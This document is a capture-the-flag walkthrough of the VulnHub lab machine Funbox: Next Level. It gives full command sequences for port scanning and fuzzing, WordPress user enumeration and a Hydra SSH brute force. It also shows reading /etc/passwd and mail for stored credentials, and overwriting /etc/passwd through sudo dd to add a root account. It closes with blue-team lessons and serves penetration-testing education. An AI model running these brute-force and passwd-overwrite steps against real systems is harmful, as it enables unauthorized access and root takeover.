# Funbox: Next Level — VulnHub Walkthrough (Beginner Friendly)

> A deliberately misleading "Drupal" directory, a WordPress site hiding behind an
> unreachable redirect, and a `sudo dd` privilege escalation. The hint says it
> all: *"The first impression is not always the right one!"*

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Next Level (Funbox 5) |
| **Difficulty** | Easy |
| **Author** | [0815R2d2](https://twitter.com/0815R2d2) |
| **Released** | 5 Sep 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-next-level,547/ |
| **Download** | https://vulnhub.com/entry/funbox-next-level,547/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Debian) |

> **Lab note:** This machine works best with **VirtualBox** rather than VMware.
> Your target IP will differ — replace `192.168.56.101` with whatever your own
> lab gives you.

---

## 0. What you will learn

- How to deal with a web server that redirects you to an **unreachable IP**.
- Bypassing broken redirects with `wfuzz` and `wpscan --ignore-main-redirect`.
- Using **Hydra** to brute-force SSH vs. brute-forcing WordPress logins.
- Reading files on a box where `cat`, `head` and `tail` have been removed.
- Using **`sudo dd`** (a GTFOBins classic) to overwrite `/etc/passwd` and add a
  new root user.

---

## 1. Reconnaissance — finding the target

First, discover the target's IP address. From Kali:

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:01      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:a1:b2:c3      2     120  PCS Systemtechnik GmbH
```

> **Why it works:** `netdiscover` sends ARP requests and listens for replies, so
> it finds hosts on your local segment even before you know their IPs. Our target
> is `192.168.56.101`.

![netdiscover output](images/01-netdiscover.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -sC -sV -p- 192.168.56.101 -oN nmap.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Only **SSH** and **HTTP** are open — the hint is clearly about the website.

> **Why it works:** `-sC` runs default scripts, `-sV` fingerprints versions, and
> `-p-` scans all 65535 ports. Knowing exact versions helps you find the right
> attack later.

![nmap scan](images/02-nmap.png)

### Directory brute force

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/dirb/wordlists/common.txt
```

```text
/drupal             (Status: 301) [--> http://192.168.56.101/drupal/]
/server-status      (Status: 403)
```

A `/drupal` directory! Naturally, you would try to open it — and that is exactly
where the trap is:

![drupal redirect hang](images/03-drupal-redirect.png)

Visiting `http://192.168.56.101/drupal` makes the browser **hang** while it tries
to reach `192.168.178.33` — an IP that does not exist on your network. Because
the page redirects there, `gobuster` also times out:

```text
Error: the server returns a redirect that cannot be followed
```

The hint is now literal: **the first impression is not always the right one**.

---

## 3. Foothold — gaining the first shell

### Bypass the redirect with wfuzz

`wfuzz` does not care that the redirect is broken — it reads the response size
directly. `--hh 274` hides any result whose body is 274 bytes long (the "invalid
redirect" default page), leaving only interesting hits:

```bash
wfuzz -c --hh 274 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
  http://192.168.56.101/drupal/FUZZ.php
```

```text
000000124:   200        0 L      0 W      0 Ch        "index"
000000287:   200        0 L      0 W      0 Ch        "wp-login"
000000501:   301        9 L      28 W      315 Ch      "wp-admin"
```

`wp-login.php` — this is **WordPress** hiding inside a folder called `drupal`.

> **Why it works:** `--hh` filters out the noise. The presence of `wp-login.php`
> tells us the "Drupal" folder is actually a WordPress install.

### Enumerate WordPress users

`wpscan` has a switch to follow redirects that would otherwise break it:

```bash
wpscan --url http://192.168.56.101/drupal --ignore-main-redirect --force -e u
```

```text
[i] User(s) Identified:
[+] admin
[+] ben
```

> **Why it works:** `-e u` enumerates users (through the REST API, author
> archives, etc.). `--ignore-main-redirect` stops wpscan choking on the broken
> redirect.

### Brute-force SSH (not WordPress)

A WordPress password attack stalls because of the redirect, so pivot to SSH
directly. `ben` is a real system account, so try Hydra against port 22:

```bash
hydra -l ben -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: ben   password: <found>
1 of 1 target successfully completed, 1 valid password found
```

```bash
ssh ben@192.168.56.101
```

> **Why it works:** Users found in WordPress are often the *same* Linux accounts.
> SSH is far more reliable to brute force here than the redirect-broken login
> form.

---

## 4. Privilege escalation — becoming root

### A box with no `cat`, no `head`, no `tail`

Once you are `ben`, normal file reading fails:

```bash
ben@funbox5:~$ cat /etc/passwd
-bash: cat: command not found
```

> **Why it works:** In a real engagement, a crippled shell is a nuisance, not a
> wall. Python reaches the same files:

```bash
ben@funbox5:~$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /etc/passwd
```

### Read Ben's mail for Adam's credentials

```bash
ben@funbox5:~$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /var/mail/ben
```

```text
Hi Ben,

please come to my office at 10:00 a.m. We have a lot to talk about!
The new employees must be created. Ive already finished Adam.

CREDS FOR ADAM:  adam:<password>
```

> **Why it works:** Local mailboxes on CTF boxes are a classic credential stash.
> On this build they are in `/var/mail/`. Use the password to switch user:

```bash
ben@funbox5:~$ su adam
```

### Check Adam's sudo rights

```bash
adam@funbox5:~$ sudo -l
```

```text
User adam may run the following commands on funbox5:
    (root) PASSWD: /bin/dd
    (root) PASSWD: /bin/de
    (root) PASSWD: /bin/df
```

`dd` as root is the way in. According to [GTFOBins](https://gtfobins.github.io/gtfobins/dd/),
`dd` can read and write arbitrary privileged files.

> **Why it works:** The `PASSWD` flag usually means a password is required, but
> the point is that **root owns the operation** — so any file `dd` writes is
> written as root.

### Overwrite `/etc/passwd` with a new root user

Generate a password hash for your own fake account:

```bash
adam@funbox5:/tmp$ openssl passwd mrcake
7.wfjKUb48CxM
```

Copy `/etc/passwd` to a temporary file (using `dd` as root), append one line, and
write it back over the real file:

```bash
adam@funbox5:/tmp$ sudo -u root /bin/dd if=/etc/passwd of=passwd_copy
adam@funbox5:/tmp$ echo 'root2:7.wfjKUb48CxM:0:0:root:/root:/bin/bash' >> passwd_copy
adam@funbox5:/tmp$ sudo -u root /bin/dd if=passwd_copy of=/etc/passwd
```

```text
4+1 records in
4+1 records out
2065 bytes (2.1 kB, 2.0 KiB) copied
```

Now switch to the account you just created:

```bash
adam@funbox5:/tmp$ su root2
Password:            # mrcake
root@funbox5:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@funbox5:~# cat /root/flag.txt
```

> **Why it works:** The `/etc/passwd` format is
> `username:password:uid:gid:comment:home:shell`. The `password` field accepts a
> **hash** (from `openssl passwd`). Setting `uid=0` makes the account
> **root-equivalent**, and `su root2` reads the hash, verifies your typed
> password, and hands over a root shell.

![root shell](images/05-root.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Misleading web directory / broken redirect used as a mild obfuscation | `/drupal` | Enumeration obstacle only |
| 2 | WordPress user enumeration | `/drupal/wp-login.php` | Usernames `ben`, `admin` leaked |
| 3 | Weak SSH password for `ben` | SSH (22) | Initial foothold |
| 4 | Credentials left in a local mailbox | `/var/mail/ben` | `adam` account compromised |
| 5 | Over-permissive `sudo` on `dd` | `sudo -l` | `/etc/passwd` overwrite → root |
| 6 | Crippled shell-based "security" by removing binaries | PATH | Trivially bypassed with Python |

---

## 6. Defensive lessons (blue team)

- **Do not rely on hidden paths or broken redirects** for security. Enumeration
  tools tolerate them; the only thing they stop is honest users.
- **WordPress leaks usernames** by default. Disable author enumeration and the
  REST API user endpoint, or put the site behind authentication.
- **Strong, unique passwords** defeat Hydra. Use long passphrases and MFA/keys.
- **Do not store credentials in `/var/mail`.** Ever.
- **Never grant `sudo` on file-manipulation tools** (`dd`, `install`, `tee`) —
  they can overwrite `/etc/passwd` and `/etc/shadow` and hand over root. Prefer
  scoped, argument-limited `sudoers` rules (e.g. `Cmnd_Alias` with fixed paths).
- **Removing `cat`/`head`/`tail` is not a control.** Interpreters (`python3`,
  `perl`, `php`) and builtins (`while read`) read the same files.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-next-level,547/
- "An ordinary day" walkthrough: https://blog.gibbons.digital/hacking/2020/10/01/nextlevel.html
- GTFOBins — `dd`: https://gtfobins.github.io/gtfobins/dd/
- WPScan: https://github.com/wpscanteam/wpscan
- Hydra: https://github.com/vanhauser-thc/thc-hydra

---

## 8. Screenshot checklist

| # | File | What to capture |
| --- | --- | --- |
| 1 | `images/01-netdiscover.png` | Target IP from `netdiscover` |
| 2 | `images/02-nmap.png` | Nmap results (22 + 80) |
| 3 | `images/03-drupal-redirect.png` | Browser hanging on the `/drupal` redirect |
| 4 | `images/04-wpscan.png` | wpscan user enumeration (`ben`, `admin`) |
| 5 | `images/05-root.png` | `id` returning `uid=0(root)` after `su root2` |
